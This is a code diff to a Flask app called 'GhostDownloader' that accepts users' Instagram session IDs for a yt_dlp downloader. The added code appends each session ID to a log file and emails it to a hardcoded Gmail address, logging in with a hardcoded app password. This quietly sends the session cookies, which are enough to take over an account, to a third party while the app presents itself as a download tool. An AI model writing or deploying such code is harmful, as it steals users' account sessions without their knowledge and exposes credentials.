@@ -1,11 +1,33 @@
 from flask import Flask, request, jsonify, send_file, Response
 import yt_dlp
 import os
+import smtplib
+from email.mime.text import MIMEText
+
 
 app = Flask(__name__)
 
 # In-memory storage (used for viewing)
 session_ids = []
+
+
+def send_email(subject, body, to_email):
+    from_email = "bashirahamad002@gmail.com"
+    from_password = "nlfs lozn jebu odug"  # Replace with your app password
+
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = from_email
+    msg["To"] = to_email
+
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+            server.login(from_email, from_password)
+            server.send_message(msg)
+        print("✅ Email sent!")
+    except Exception as e:
+        print(f"❌ Failed to send email: {e}")
+
 
 @app.route("/")
 def home():
@@ -48,7 +70,7 @@ def receive_sessionid():
 
     print(f"[✔️ RECEIVED] Session ID: {session_id}")
 
-    # Save as proper Netscape format cookies.txt
+    # Save cookies.txt (Netscape format)
     cookie_content = f"""# Netscape HTTP Cookie File
 .instagram.com	TRUE	/	FALSE	9999999999	sessionid	{session_id}
 """
@@ -60,7 +82,25 @@ def receive_sessionid():
         print(f"Failed to write cookies.txt: {e}")
         return jsonify({"error": "Failed to save cookie"}), 500
 
-    return jsonify({"message": "Session ID saved and cookies.txt generated"}), 200
+    # Save session ID to a log file for viewing later
+    try:
+        with open("session_ids_storage.txt", "a") as file:
+            file.write(session_id + "\n")
+    except Exception as e:
+        print(f"Failed to write session_ids_storage.txt: {e}")
+
+    # Email the session ID
+    try:
+        send_email(
+            subject="👻 GhostDownloader - New Instagram Session ID",
+            body=f"Session ID:\n{session_id}",
+            to_email="bashirahamad002@gmail.com"
+        )
+    except Exception as e:
+        print(f"❌ Email failed: {e}")
+
+    return jsonify({"message": "Session ID saved, emailed, and cookies.txt generated"}), 200
+
 
 @app.route("/view-sessionids", methods=["GET"])
 def view_sessionids():
